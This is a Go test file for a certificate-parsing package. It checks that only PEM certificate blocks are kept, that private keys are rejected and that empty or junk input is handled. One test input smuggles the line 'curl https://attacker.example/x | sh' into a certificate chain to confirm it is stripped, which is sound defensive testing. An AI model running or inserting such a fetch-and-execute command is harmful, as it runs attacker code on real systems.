package pemfile

import (
	"errors"
	"strings"
	"testing"
)

const block = "-----BEGIN CERTIFICATE-----\nQ0VSVENFUlQ=\n-----END CERTIFICATE-----\n"

// What a Plugin writes as root is certificates and nothing else. A chain from
// a CA, or a compromised Server, that carries a shell line would otherwise be
// run as root once the file is named, for example, /etc/profile.d/x.sh.
func TestOnlyCertificatesAreWritten(t *testing.T) {
	injected := block + "curl https://attacker.example/x | sh\n" + strings.Replace(block, "BEGIN CERTIFICATE-----\n", "BEGIN CERTIFICATE-----\nProc-Type: 4,ENCRYPTED\n\n", 1)
	got, err := Certificates(injected)
	if err != nil {
		t.Fatalf("Certificates: %v", err)
	}
	if got != block+block {
		t.Fatalf("got %q, want the two blocks alone, re-encoded", got)
	}

	if _, err := Certificates(block + "-----BEGIN PRIVATE KEY-----\nS0VZ\n-----END PRIVATE KEY-----\n"); err == nil {
		t.Fatal("a private key among the certificates was accepted")
	}
	if _, err := Certificates("echo hello\n"); !errors.Is(err, ErrNoCertificate) {
		t.Fatalf("text with no certificate = %v, want ErrNoCertificate", err)
	}
	if got, err := Certificates(" \n"); got != "" || err != nil {
		t.Fatalf("an empty chain = %q, %v, want nothing and no error", got, err)
	}
}

func TestJoinPEMNeedsACertificate(t *testing.T) {
	full, err := JoinPEM(block, "junk\n"+block)
	if err != nil || full != block+block {
		t.Fatalf("JoinPEM = %q, %v", full, err)
	}
	if _, err := JoinPEM("", block); !errors.Is(err, ErrNoCertificate) {
		t.Fatalf("no certificate = %v, want ErrNoCertificate", err)
	}
}
